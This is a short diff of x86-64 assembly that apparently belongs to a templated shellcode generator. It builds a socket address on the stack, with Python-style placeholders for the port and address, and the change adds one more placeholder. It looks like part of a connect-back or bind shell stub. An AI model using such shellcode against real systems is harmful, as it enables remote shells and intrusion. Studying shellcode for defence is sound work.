@@ -29,7 +29,7 @@ start:
     js fail
 
     xchg rdi, rax
-    movabs rcx, 0x{}0002
+    movabs rcx, 0x{}{}0002
     push rcx
     mov rsi, rsp
     push 0x10
